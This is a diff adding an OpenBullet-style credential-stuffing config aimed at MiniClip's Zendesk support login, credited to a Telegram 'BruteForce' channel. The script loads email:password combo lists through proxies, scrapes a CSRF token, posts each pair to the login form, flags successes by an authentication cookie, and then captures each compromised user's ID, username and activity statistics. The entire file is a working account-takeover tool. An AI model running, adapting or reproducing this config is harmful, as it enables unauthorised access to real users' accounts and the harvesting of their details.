@@ -1,0 +1,95 @@
+[SETTINGS]
+{
+  "Name": "MiniClip",
+  "SuggestedBots": 100,
+  "MaxCPM": 0,
+  "LastModified": "2021-10-05T00:59:46.7146923+03:30",
+  "AdditionalInfo": "Telegram Channel: @BruteForce | Capture | CPM Rate: 100-1000",
+  "RequiredPlugins": [],
+  "Author": "@TheOwn",
+  "Version": "1.2.2",
+  "SaveEmptyCaptures": false,
+  "ContinueOnCustom": false,
+  "SaveHitsToTextFile": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "BanProxyAfterGoodStatus": false,
+  "BanLoopEvasionOverride": -1,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "QuitOnBanRetry": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Get REQUEST GET "https://miniclip.zendesk.com/access/login" 
+  
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Token PARSE "<SOURCE>" LR "meta name=\"csrf-token\" content=\"" "\"" -> VAR "Token" 
+
+#TTT FUNCTION URLEncode "<Token>" -> VAR "TTT" 
+
+#Post REQUEST POST "https://miniclip.zendesk.com/access/login" 
+  CONTENT "utf8=%E2%9C%93&authenticity_token=<TTT>&return_to_on_failure=%2Fauth%2Fv2%2Flogin%2Fsignin%3Freturn_to%3Dhttps%253A%252F%252Fsupport.miniclip.com%252Fhc%252Fen-us%252Fsections%252F200633306-Manage-my-Profile-Account%26theme%3Dhc%26locale%3Den-us%26brand_id%3D1543476%26auth_origin%3D1543476%252Ctrue%252Ctrue%26browser%3Dchrome&return_to=https%3A%2F%2Fsupport.miniclip.com%2Fauth%2Fv2%2Flogin%2Fsigned_in%3Fauth_origin%3D1543476%252Ctrue%252Ctrue%26brand_id%3D1543476%26theme%3Dhc&brand_id=1543476&theme=hc&auth_origin=1543476%2Ctrue%2Ctrue&form_origin=hc&user%5Bemail%5D=<USER>&user%5Bpassword%5D=<PASS>&commit=Sign+in" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER ": path: /access/login" 
+  HEADER "accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9" 
+  HEADER "accept-encoding: gzip, deflate, br" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+  HEADER "cache-control: max-age=0" 
+  HEADER "content-length: 729" 
+  HEADER "content-type: application/x-www-form-urlencoded" 
+  HEADER "origin: https://miniclip.zendesk.com" 
+  HEADER "sec-ch-ua: \"Chromium\";v=\"92\", \" Not A;Brand\";v=\"99\", \"Google Chrome\";v=\"92\"" 
+  HEADER "sec-ch-ua-mobile: ?0" 
+  HEADER "sec-fetch-dest: iframe" 
+  HEADER "sec-fetch-mode: navigate" 
+  HEADER "sec-fetch-site: same-origin" 
+  HEADER "sec-fetch-user: ?1" 
+  HEADER "upgrade-insecure-requests: 1" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "combination is incorrect" 
+  KEYCHAIN Success OR 
+    KEY "<COOKIES{*}>" Contains "_zendesk_authenticated" 
+
+#GetC1 REQUEST GET "https://support.miniclip.com/hc/en-us" 
+  
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.131 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Player_ID PARSE "<HEADERS(X-Zendesk-User-Id)>" LR "" "" CreateEmpty=FALSE -> CAP "Player ID" 
+
+#UserName PARSE "<SOURCE>" LR "<span id=\"user-name\">" "</span>" CreateEmpty=FALSE -> CAP "UserName" 
+
+#GetC2 REQUEST GET "https://support.miniclip.com/hc/en-us/profiles/<Player ID>-<UserName>" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+
+#Total_Activity PARSE "<SOURCE>" LR "<span class=\"stat-value\">" "</span>" CreateEmpty=FALSE -> CAP "Total Activity" 
+
+#Last_Activity PARSE "<SOURCE>" LR "<time datetime=\"" "\"" CreateEmpty=FALSE -> CAP "Last Activity" 
+
+#Following PARSE "<SOURCE>" LR "<span class=\"stat-value\">" "</span>" CreateEmpty=FALSE -> CAP "Following" 
+
